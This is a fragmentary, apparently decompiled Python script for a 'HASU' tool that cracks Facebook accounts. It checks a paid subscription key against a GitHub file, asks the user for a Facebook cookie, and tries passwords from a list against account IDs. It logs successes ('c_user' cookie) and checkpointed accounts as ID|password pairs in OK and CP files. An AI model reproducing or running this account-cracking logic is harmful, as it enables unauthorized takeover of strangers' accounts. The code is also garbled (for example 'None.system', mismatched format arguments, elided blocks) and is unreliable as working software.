    ...
    for xd in range(10000):
        ...
        for x in range(10):
            ...
            def Subscraption():
                ...
                clear()
                print(logo)
                r1 = requests.get('https://raw.githubusercontent.com/HasaanMirza/Fucking/main/5.txt').text
                if key1 in r1:
                    os.system('clear')
                    print(logo)
                    login()
                ...
                None.system('clear')
                print(logo)
                jalan('\n%s %s%s Cheaking HASU Tool Subscription ......' % (P, M, P))
                time.sleep(4)
                os.system('clear')
                print(logo)
                print('')
...
def login_lagi334():
    ...
    print('-----------------------------------------------')
    jalan('\n%s %s%s Welcome To HASU Free Tool.....' % (P, M, P))
    print('-----------------------------------------------')
    cookie = input('\n [+] Put Cookie : ')
    if cookie in ('get', 'Get'):
        os.system('xdg-open https://www.facebook.com/HASUkhano71')
    loading()
...
def hasil(OK, cp):
    if not len(OK) != 0:
        pass
    if len(cp) != 0:
        print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mHASU_OK.txt' % (H, P, str(len(ok))))
        print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mHASU_CP.txt' % (H, P, str(len(cp))))
        input('\x1b[1;97mPress enter to back HASU Menu ')
        menu(my_name, my_id)
        return None
...
def menu(my_name, my_id):
    ...
    print(logo)
    jalan('\n%s %s%s\x1b[1;32m              WELCOME  TO HASU FREE TOOL ' % (P, M, P))
    ...
    for pw in pwv:
        ...
        try:
            ...
            if 'checkpoint' in po.cookies.get_dict().keys():
                print(f'''\r\x1b[38;5;208m [HASU-CP] {idf} | {pw}''')
        ...
        if 'c_user' in ses.cookies.get_dict().keys():
            ...
            month = dec_ttl[month]
            print(f'''\r\x1b[1;92m [HASU-OK] {idf} | {pw}''')
